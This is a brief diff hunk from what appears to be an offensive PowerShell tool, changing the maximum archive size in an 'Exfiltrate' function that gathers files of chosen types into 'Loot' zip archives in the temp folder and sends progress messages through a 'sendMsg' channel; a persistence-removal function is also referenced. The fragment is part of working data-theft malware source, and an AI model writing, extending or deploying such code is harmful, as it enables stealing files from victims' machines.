@@ -646,7 +646,7 @@ Function RemovePersistance{
 Function Exfiltrate {
     param ([string[]]$FileType,[string[]]$Path)
     sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
-    $maxZipFileSize = 25MB
+    $maxZipFileSize = 10MB
     $currentZipSize = 0
     $index = 1
     $zipFilePath ="$env:temp/Loot$index.zip"
